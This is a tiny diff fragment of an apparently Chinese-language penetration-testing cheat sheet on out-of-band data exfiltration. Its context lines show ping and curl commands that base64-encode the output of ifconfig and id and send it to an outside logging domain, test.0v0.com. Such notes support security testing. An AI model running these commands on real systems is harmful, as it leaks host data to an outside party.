@@ -166,7 +166,6 @@ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
 id|base64
 
 使用实例：
-
 curl test.0v0.com/`ifconfig|base64 -w 0` 
 #-w 0 输出内容不换行，推荐这个方法
 curl test.0v0.com/`ifconfig|base64|tr '\n' '-'`
